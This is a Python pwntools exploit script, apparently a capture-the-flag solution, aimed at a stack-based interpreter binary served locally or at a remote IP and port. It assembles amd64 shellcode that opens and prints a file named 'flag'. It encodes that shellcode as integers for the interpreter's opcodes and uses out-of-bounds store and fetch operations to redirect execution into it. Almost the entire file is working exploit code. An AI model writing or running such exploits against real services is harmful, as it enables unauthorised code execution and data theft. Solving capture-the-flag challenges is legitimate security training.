#!/usr/bin/env python
# coding: utf-8

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'

local = False

if local:
	p = process('./user.elf')
	gdb.attach(p, gdbscript=open('pie.x'))
else:
	p = remote('35.200.23.198', 31733)
	pass


def byte2int(payload):
	ret = []
	for i in range(0, len(payload), 4):
		ret.append(u32(payload[i:i+4].ljust(4, '\0')))
	return ret

# 0x25: pop
# 0x2B: add
# 0x2E: writed
# 0x3A: store
# 0x3B: fetch
# 0x5C: swap

sc = ''
sc += shellcraft.amd64.linux.open('flag', 0)
sc += 'lea r9, [rip+0x1000]'
sc += shellcraft.amd64.linux.read(3, 'r9', 0x40)
sc += shellcraft.amd64.linux.write(1, 'r9', 0x80)
print(sc)
sc = asm(sc, arch='amd64')
#sc = '\xbe\xbe\xef\xef\xab\xab\xbc\xbc'

sc_addr = 0x2020A8
payload = str(0) + '\x7D'
arr = byte2int(sc)
payload += '\x7D'.join(str(x & 0xFFFFFFFF) for x in arr)
payload += (len(arr) + 1) * '\x25'
payload += str(-27 & 0xFFFFFFFF) + '\x5C' + str(0) + '\x3A' + str(1) + '\x3A'
payload += (str(0x41414141) + '\x7D') * 4
payload += str(1) + '\x3B' + str(sc_addr - 0x7B6) + '\x2B' + str(0) + '\x3B' + '\x2E'

p.recvuntil('down.\n')
p.sendline(payload)

p.interactive()
